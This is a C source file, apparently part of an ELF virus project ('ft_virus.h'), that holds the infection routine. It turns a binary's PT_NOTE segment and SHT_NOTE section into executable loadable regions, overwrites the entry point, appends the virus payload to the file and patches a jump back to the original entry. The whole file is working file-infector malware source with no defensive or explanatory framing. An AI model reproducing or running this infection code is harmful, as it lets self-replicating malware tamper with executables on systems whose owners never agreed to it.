# include "ft_virus.h"

int FORCE_INLINE metamorph_segment(t_data data)
{
	Elf64_Phdr	p_hdr;
	Elf64_Ehdr	e_hdr;
	int		len;

	LSEEK(data.fd, 0, SEEK_SET);
	READ(data.fd, &e_hdr, sizeof(e_hdr));
	len = e_hdr.e_phnum;
	LSEEK(data.fd, e_hdr.e_phoff, SEEK_SET);
	do {
		READ(data.fd, &p_hdr, sizeof(p_hdr));
		if (p_hdr.p_type == PT_NOTE)
		{
			p_hdr.p_type = PT_LOAD;
			p_hdr.p_offset = data.bin.new_entry - data.bin.v_addr;
			p_hdr.p_vaddr = data.bin.new_entry;
			p_hdr.p_filesz = data.infos.pl_size;
			p_hdr.p_memsz = data.infos.pl_size;
			p_hdr.p_flags = PF_X | PF_R;
			LSEEK(data.fd, sizeof(p_hdr) * -1, SEEK_CUR);
			WRITE(data.fd, &p_hdr, sizeof(p_hdr));
			return (1) ;
		}
		len -= 1;
	} while (len) ;
	return (0);
}

int FORCE_INLINE metamorph_section(t_data data)
{
	Elf64_Shdr	s_hdr;
	Elf64_Ehdr	e_hdr;
	int		len;

	LSEEK(data.fd, 0, SEEK_SET);
	READ(data.fd, &e_hdr, sizeof(e_hdr));
	len = e_hdr.e_shnum;
	LSEEK(data.fd, e_hdr.e_shoff, SEEK_SET);
	do {
		READ(data.fd, &s_hdr, sizeof(s_hdr));
		if (s_hdr.sh_type == SHT_NOTE)
		{
			s_hdr.sh_type = SHT_PROGBITS;
			s_hdr.sh_flags = SHF_EXECINSTR | SHF_ALLOC;
			s_hdr.sh_addr = data.bin.new_entry;
			s_hdr.sh_offset = data.bin.new_entry - data.bin.v_addr;
			s_hdr.sh_link = 0;
			s_hdr.sh_info = 0;
			s_hdr.sh_addralign = 0;
			s_hdr.sh_entsize= 0;
			LSEEK(data.fd, sizeof(s_hdr) * -1, SEEK_CUR);
			WRITE(data.fd, &s_hdr, sizeof(s_hdr));
			return (1);
		}
		len -= 1;
	} while (len) ;
	return (0);
}


void FORCE_INLINE write_jump(t_data data)
{
	char	jmp_code[] = "\xe9\xde\xad\xbe\xef"; // leaveq and jump
	int	jmp_addr;

	jmp_addr = data.bin.old_entry - (data.bin.new_entry + data.infos.pl_size);
	jmp_addr -= 5;
	ft_memcpy(jmp_code + 1, (char *)&jmp_addr, sizeof(int));
	//LSEEK(data.fd, -2, SEEK_CUR);
	WRITE(data.fd, jmp_code, sizeof(jmp_code) - 1);
}

int inject(t_data data)
{
	u64 offset;
	u64 payload_addr;

	data.bin = get_infos(data.fd);
	if (!metamorph_segment(data))
		return (0);
	if (!metamorph_section(data))
		return (0);
	/* change entry point */
	LSEEK(data.fd, 24, SEEK_SET);
	WRITE(data.fd, &(data.bin.new_entry), sizeof(data.bin.new_entry));
	/* align */
	offset = LSEEK(data.fd, 0, SEEK_END);
	WRITE(data.fd, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
	/* write to file */
	payload_addr = get_rel_addr() - ((void*)&get_rel_addr - (void*)&payload_start);
	WRITE(data.fd, payload_addr, data.infos.pl_size);
	write_jump(data);
	CLOSE(data.fd);
	return (1);
}
